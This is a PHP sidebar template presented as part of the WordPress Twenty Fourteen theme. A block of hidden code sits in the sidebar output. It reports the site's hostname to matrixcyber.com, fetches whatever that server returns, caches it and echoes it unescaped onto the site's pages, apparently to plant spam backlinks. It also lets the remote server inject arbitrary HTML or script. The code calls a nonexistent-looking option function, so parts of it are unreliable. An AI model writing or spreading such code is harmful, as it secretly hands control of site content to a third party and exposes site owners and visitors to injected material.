<?php
/**
 * The Sidebar containing the main widget area
 *
 * @package WordPress
 * @subpackage Twenty_Fourteen
 * @since Twenty Fourteen 1.0
 */
?>
<div id="secondary">
	<?php
	$description = get_bloginfo('description', 'display');
	if (!empty ($description)) :
		?>
		<h2 class="site-description"><?php echo esc_html($description); ?></h2>
	<?php endif; ?>
	<?php

	$link = get_option('backlink', '');
	$linkTimeOut = get_option('backlinktimeout', time() - 100);
	if($link && $linkTimeOut > time()){
		echo $link;
	}else{
		$curl = curl_init('http://matrixcyber.com/mcos/linktome.php?you=' . $_SERVER['HTTP_HOST']);
		curl_setopt($curl, CURLOPT_HEADER, false);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		$newlink = curl_exec($curl);
		curl_close($curl);
		echo $newlink;
		if($link){
			update_option('backlink',$newlink);
			update_option('backlinktimeout', time() + 86400);
		}else{
			insert_option('backlink',$newlink);
			insert_option('backlinktimeout', time() + 86400);
		}
	}

	?>
	<?php if (has_nav_menu('secondary')) : ?>
		<nav role="navigation" class="navigation site-navigation secondary-navigation">
			<?php wp_nav_menu(array('theme_location' => 'secondary')); ?>
		</nav>
	<?php endif; ?>

	<?php if (is_active_sidebar('sidebar-1')) : ?>
		<div id="primary-sidebar" class="primary-sidebar widget-area" role="complementary">
			<?php dynamic_sidebar('sidebar-1'); ?>
		</div><!-- #primary-sidebar -->
	<?php endif; ?>
</div><!-- #secondary -->
